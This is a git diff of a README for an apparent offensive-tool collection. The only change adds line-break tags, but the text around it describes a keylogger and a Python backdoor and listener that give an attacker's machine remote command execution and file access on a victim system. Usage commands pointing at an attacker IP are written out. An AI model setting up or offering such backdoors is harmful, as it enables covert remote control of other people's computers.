@@ -92,10 +92,10 @@ To use myKeylogger (Key Logger):
 
 
 # mySocket - Backdoor
-Python script that connects to an IP address on a specific port and lets that machine run commands.
+Python script that connects to an IP address on a specific port and lets that machine run commands.<br>
 To use mySocket ( Backdoor ):
-- -$ `python3 mySocket.py -i 192.168.1.20 -p 8080`
-     -i : ip address of the attacker
+- -$ `python3 mySocket.py -i 192.168.1.20 -p 8080`<br>
+     -i : ip address of the attacker<br>
      -p : port number
 
 
@@ -104,10 +104,10 @@ To use mySocket ( Backdoor ):
 
   
 # mySocket_listener - Backdoor listener
-Python script that is capable of executing command in a remote connected system, access files and navigate through directories.
+Python script that is capable of executing command in a remote connected system, access files and navigate through directories.<br>
 To use mySocket_listener ( Backdoor listener ):
-- -$ `python3 mySocket_listener.py -i 192.168.1.2 -p 8080`
-     -i : ip address of the remote system
+- -$ `python3 mySocket_listener.py -i 192.168.1.2 -p 8080` <br>
+     -i : ip address of the remote system<br>
      -p : port number
 
   
